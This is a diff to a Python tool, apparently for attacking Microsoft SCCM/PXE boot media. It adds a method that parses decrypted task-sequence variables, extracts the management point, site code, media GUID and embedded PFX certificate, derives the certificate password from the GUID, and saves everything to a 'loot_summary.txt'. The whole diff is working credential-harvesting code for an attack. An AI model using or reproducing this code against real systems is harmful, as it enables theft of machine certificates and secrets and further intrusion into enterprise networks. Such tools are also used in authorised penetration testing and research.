@@ -1,6 +1,8 @@
 import struct
 import socket
 import time
+import os
+import xml.etree.ElementTree as ET
 from hashlib import *
 from scapy.all import *
 import binascii
@@ -183,3 +185,64 @@ class SCCM:
         # Strip trailing nulls and non-printable chars
         decrypted = decrypted[:decrypted.rfind('\x00')]
         return "".join(c for c in decrypted if c.isprintable())
+
+    def extract_media_variables(self, xml_text, output_dir):
+        """Parse decrypted media variables XML and extract PFX cert and key info.
+        Writes files to output_dir and returns a dict of extracted values.
+        """
+        os.makedirs(output_dir, exist_ok=True)
+
+        root = ET.fromstring(xml_text.encode("utf-16-le"))
+
+        result = {}
+
+        # Extract all variables for reference
+        for var in root.findall('.//var'):
+            name = var.get('name', '')
+            result[name] = var.text or ''
+
+        # Write full XML
+        xml_path = os.path.join(output_dir, "variables.xml")
+        with open(xml_path, "w") as f:
+            f.write(xml_text)
+        print(f"[*] Wrote decrypted variables to {xml_path}")
+
+        # Extract key values
+        site_code = result.get('_SMSTSSiteCode', '')
+        media_guid = result.get('_SMSMediaGuid', '')
+        mp_url = result.get('SMSTSMP', '')
+        pfx_hex = result.get('_SMSTSMediaPFX', '')
+
+        print(f"[*] Management Point: {mp_url}")
+        print(f"[*] Site Code: {site_code}")
+        print(f"[*] Media GUID: {media_guid}")
+
+        # PFX password is first 31 chars of the media GUID
+        pfx_password = media_guid[:31]
+
+        if pfx_hex:
+            pfx_bytes = bytes.fromhex(pfx_hex)
+            pfx_filename = f"{site_code}_SMSTSMediaPFX.pfx"
+            pfx_path = os.path.join(output_dir, pfx_filename)
+            with open(pfx_path, "wb") as f:
+                f.write(pfx_bytes)
+            print(f"[*] Wrote PFX certificate ({len(pfx_bytes)} bytes) to {pfx_path}")
+            print(f"[*] PFX password: {pfx_password}")
+
+        # Write a summary file with all the info needed for next steps
+        summary_path = os.path.join(output_dir, "loot_summary.txt")
+        with open(summary_path, "w") as f:
+            f.write(f"Management Point: {mp_url}\n")
+            f.write(f"Site Code: {site_code}\n")
+            f.write(f"Media GUID: {media_guid}\n")
+            f.write(f"PFX Password: {pfx_password}\n")
+            f.write(f"PFX File: {pfx_filename if pfx_hex else 'N/A'}\n")
+            f.write(f"\nAll Variables:\n")
+            for name, value in result.items():
+                if name == '_SMSTSMediaPFX':
+                    f.write(f"  {name} = [{len(value)} hex chars]\n")
+                else:
+                    f.write(f"  {name} = {value}\n")
+        print(f"[*] Wrote loot summary to {summary_path}")
+
+        return result
